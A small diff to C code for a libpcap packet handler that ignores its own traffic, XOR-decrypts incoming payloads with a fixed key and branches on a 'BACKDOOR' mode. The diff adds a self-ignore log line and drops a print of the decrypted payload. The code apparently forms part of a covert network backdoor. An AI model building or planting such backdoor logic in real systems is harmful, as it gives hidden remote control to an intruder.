@@ -117,13 +117,13 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header,
 
     if (ip->ip_src.s_addr == this_ip.s_addr)
     {
+        printf("ignoring packet from self\n");
         return;
     }
 
     // Step 3: Decrypt the payload
     xor_bytes(XOR_KEY, strlen(XOR_KEY), payload, decrypted,
               size_payload);
-    printf("Decrypted payload: %s\n", decrypted);
 
     if (mode == BACKDOOR)
     {
